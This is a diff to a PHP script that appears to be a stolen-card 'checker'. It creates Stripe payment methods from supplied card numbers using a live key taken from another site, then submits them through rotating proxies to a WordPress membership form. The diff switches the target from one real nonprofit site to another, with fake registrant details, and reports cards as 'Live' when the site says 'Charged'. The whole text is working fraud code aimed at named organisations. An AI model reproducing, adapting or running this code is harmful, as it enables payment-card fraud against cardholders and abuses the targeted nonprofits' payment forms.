@@ -82,7 +82,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=8c6bf9e6-557a-4268-bc09-b2ef7999768c48ddc2&sid=d92ed724-72b1-4cba-968c-87e97a786ef253ff00&pasted_fields=number&payment_user_agent=stripe.js%2F327b5a4b1f%3B+stripe-js-v3%2F327b5a4b1f%3B+card-element&referrer=https%3A%2F%2Fnewingtonartleague.org&time_on_page=63239&key=pk_live_51N1BqMENV3HnJRUGrRed9iXcWt4ylaaVROlP7XCIZWnJgNDuotNu2SFa6yHr1QhtadMuzE4ayhrfuwVH5MBmZXaF00ZEc2M4qJ');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=ca1e6427-8abe-4e16-a4d5-309b9a13da71c4b585&sid=482a60bf-5af2-45a4-a914-d63875ee91bf727474&pasted_fields=number&payment_user_agent=stripe.js%2F327b5a4b1f%3B+stripe-js-v3%2F327b5a4b1f%3B+card-element&referrer=https%3A%2F%2Famenaustralia.org&time_on_page=282412&key=pk_live_51N1T9rEYhF4M0Q0zIpXEA9YgCXPJbyznNF0qzlcBzyv7Ib0hHFdxT88yoJ5zJa3Nn6e9V2Zs3RbXAzb5HZH2aA9E00RMJu6ufy');
 
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
@@ -95,7 +95,7 @@ $PROXYSCRAPE_PORT = 6060;
 $PROXYSCRAPE_HOSTNAME = 'rp.proxyscrape.com';
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://newingtonartleague.org/wp-admin/admin-ajax.php?t=1713097252637');
+curl_setopt($ch, CURLOPT_URL, 'https://amenaustralia.org/wp-admin/admin-ajax.php?t=1713142681576');
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_PROXYPORT, $PROXYSCRAPE_PORT);
@@ -110,22 +110,22 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'POST /wp-admin/admin-ajax.php?t=1713097252637 h2',
-'Host: newingtonartleague.org',
+'POST /wp-admin/admin-ajax.php?t=1713142681576 h2',
+'Host: amenaustralia.org',
 'accept: */*',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-'origin: https://newingtonartleague.org',
+'origin: https://amenaustralia.org',
 'sec-fetch-site: same-origin',
 'sec-fetch-mode: cors',
 'sec-fetch-dest: empty',
-'referer: https://newingtonartleague.org/membership/',
+'referer: https://amenaustralia.org/membership-registration/',
 'accept-language: en-US,en;q=0.9',
    ));
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D13%26_fluentform_3_fluentformnonce%3D2530a3c122%26_wp_http_referer%3D%252Fmembership%252F%26payment_input_1%3DStudent%2520(age%252016%2520and%2520up)%2520(%252410)%26input_radio%3DNew%2520Member%26names%255Bfirst_name%255D%3DGloo%26names%255Blast_name%255D%3DSmoke%26address_1%255Baddress_line_1%255D%3DStreet%252027%26address_1%255Baddress_line_2%255D%3D%26address_1%255Bcity%255D%3DNew%2520York%26address_1%255Bstate%255D%3DNY%26address_1%255Bzip%255D%3D10014%26email%3Dgloosmoke%2540gmail.com%26input_mask%3D%26dropdown%3D%26payment_method%3Dstripe%26__entry_intermediate_hash%3D09239c080a1549f1aba8fa7d0f7da21e%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=3');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D1656%26_fluentform_5_fluentformnonce%3Daf63650288%26_wp_http_referer%3D%252Fmembership-registration%252F%26name_1%255Bfirst_1_3%255D%3DGloo%26name_1%255Blast_1_6%255D%3DSmoke%26email_2%3D'.$id.'%2540gmail.com%26user_role%3Dretired%26input_text%3D'.$id.'%26password%3DGloo%2540123%26name_8%255Bfirst_8_3%255D%3D%26name_8%255Bmiddle_8_4%255D%3D%26name_8%255Blast_8_6%255D%3D%26address_9%255Bstreet_address_9_1%255D%3D%26address_9%255Baddress_line_2_9_2%255D%3D%26address_9%255Bcity_9_3%255D%3D%26address_9%255Bstate_province_9_4%255D%3D%26address_9%255Bzip_postal_code_9_5%255D%3D%26address_9%255Bcountry_9_6%255D%3D%26payment_input_3%3D0%26payment_method%3Dstripe%26__entry_intermediate_hash%3De4d356b380d6414ada8a3804d7767c0f%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=5');
 
 $result2a = curl_exec($ch);
 
@@ -197,9 +197,9 @@ $response = "Expired Card 🚫";
   }
 
 
-elseif (strpos($result2a, 'Thank you for joining!')){
+elseif (strpos($result2a, 'Thank you for registering!')){
   $status = "Live 🟢";
-$response = "Charged 1$ ✅";
+$response = "Charged 25$ ✅";
 
   }
 
